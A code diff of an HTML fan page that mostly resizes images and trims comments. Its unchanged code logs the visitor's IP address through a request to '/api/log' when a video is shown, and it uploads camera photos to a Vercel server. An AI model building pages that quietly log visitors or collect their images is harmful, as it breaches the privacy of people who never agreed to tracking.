@@ -48,7 +48,7 @@
     }
 
     img {
-      width: 200px;
+      width: 180px;
       border-radius: 10px;
       margin: 5px;
     }
@@ -78,11 +78,10 @@
 
     <br>
 
-    <!-- CAMERA BUTTON -->
     <button onclick="openCamera()">Take Fan Photo 📸</button>
   </div>
 
-  <!-- CAMERA AREA -->
+  <!-- CAMERA -->
   <div id="cameraBox">
     <video id="video" autoplay></video>
     <br>
@@ -98,11 +97,10 @@ let stream;
 /* SHOW VIDEO + LOG IP */
 function showVideo() {
   document.getElementById("videoBox").style.display = "block";
-
   fetch("/api/log");
 }
 
-/* OPEN CAMERA (ASKS PERMISSION) */
+/* OPEN CAMERA */
 function openCamera() {
   document.getElementById("cameraBox").style.display = "block";
 
@@ -116,7 +114,7 @@ function openCamera() {
     });
 }
 
-/* CAPTURE IMAGE + SEND TO VERCEL */
+/* CAPTURE PHOTO + SEND TO VERCEL */
 function capture() {
   const video = document.getElementById("video");
   const canvas = document.getElementById("canvas");
